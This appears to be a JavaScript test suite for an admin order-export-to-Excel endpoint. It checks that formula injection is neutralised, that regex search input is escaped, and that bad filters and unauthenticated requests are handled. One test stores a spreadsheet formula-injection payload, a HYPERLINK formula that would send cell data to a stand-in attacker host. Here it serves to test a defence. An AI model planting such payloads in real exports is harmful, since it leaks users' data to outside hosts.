const request = require('supertest');
const ExcelJS = require('exceljs');
const { buildTestApp } = require('../helpers/app');
const { makeAdminSession } = require('../helpers/factories');
const Order = require('../../models/Order');

// supertest/superagent has no built-in parser for the xlsx content type, so
// the response has to be buffered manually to get the raw bytes ExcelJS can load.
function bufferParser(res, cb) {
	const chunks = [];
	res.on('data', (chunk) => chunks.push(chunk));
	res.on('end', () => cb(null, Buffer.concat(chunks)));
}

describe('GET /api/admin/orders/export/excel', () => {
	let app;

	beforeAll(() => {
		app = buildTestApp();
	});

	it('prefixes a formula-injection payload so Excel renders it as text, not a formula', async () => {
		const { cookies } = await makeAdminSession(app);
		await Order.create({
			orderCode: 'ORDXLS1',
			isDirectSale: true,
			status: 'confirmed',
			items: [],
			totalAmount: 0,
			additionalNote: '=HYPERLINK("http://evil.example/"&A1,"click")'
		});

		const res = await request(app)
			.get('/api/admin/orders/export/excel')
			.set('Cookie', cookies)
			.buffer(true)
			.parse(bufferParser);

		expect(res.status).toBe(200);

		const workbook = new ExcelJS.Workbook();
		await workbook.xlsx.load(res.body);
		const worksheet = workbook.getWorksheet('Đơn hàng');
		// A loaded worksheet does not restore the write-time column->key
		// mapping, so cells are addressed by column letter here: L is
		// "Ghi chú" (additionalNote), the 12th of the 13 defined columns.
		const noteCell = worksheet.getRow(2).getCell('L');

		expect(String(noteCell.value)).toMatch(/^'=/);
		expect(noteCell.type).not.toBe(ExcelJS.ValueType.Formula);
	});

	it('drops an unrecognised status filter instead of silently returning zero rows', async () => {
		const { cookies } = await makeAdminSession(app);
		await Order.create({ orderCode: 'ORDXLS2', isDirectSale: true, status: 'confirmed', items: [], totalAmount: 0 });

		const res = await request(app)
			.get('/api/admin/orders/export/excel')
			.query({ status: 'totally-not-a-real-status' })
			.set('Cookie', cookies)
			.buffer(true)
			.parse(bufferParser);

		expect(res.status).toBe(200);
		const workbook = new ExcelJS.Workbook();
		await workbook.xlsx.load(res.body);
		const worksheet = workbook.getWorksheet('Đơn hàng');
		expect(worksheet.rowCount).toBe(2); // header + the one order
	});

	it('escapes regex metacharacters in the search filter instead of running them as a pattern', async () => {
		const { cookies } = await makeAdminSession(app);
		await Order.create({ orderCode: 'ORDX.1', isDirectSale: true, status: 'confirmed', items: [], totalAmount: 0 });
		await Order.create({ orderCode: 'ORDXY1', isDirectSale: true, status: 'confirmed', items: [], totalAmount: 0 });

		const res = await request(app)
			.get('/api/admin/orders/export/excel')
			.query({ search: 'ORDX.1' })
			.set('Cookie', cookies)
			.buffer(true)
			.parse(bufferParser);

		expect(res.status).toBe(200);
		const workbook = new ExcelJS.Workbook();
		await workbook.xlsx.load(res.body);
		const worksheet = workbook.getWorksheet('Đơn hàng');
		// An unescaped "." is "any character" and would also match ORDXY1.
		// Escaped, "ORDX.1" only matches the literal dot.
		expect(worksheet.rowCount).toBe(2); // header + exactly the literal match
		expect(worksheet.getRow(2).getCell('A').value).toBe('ORDX.1'); // A = orderCode
	});

	it('rejects an unauthenticated request', async () => {
		const res = await request(app).get('/api/admin/orders/export/excel');
		expect([401, 403]).toContain(res.status);
	});
});
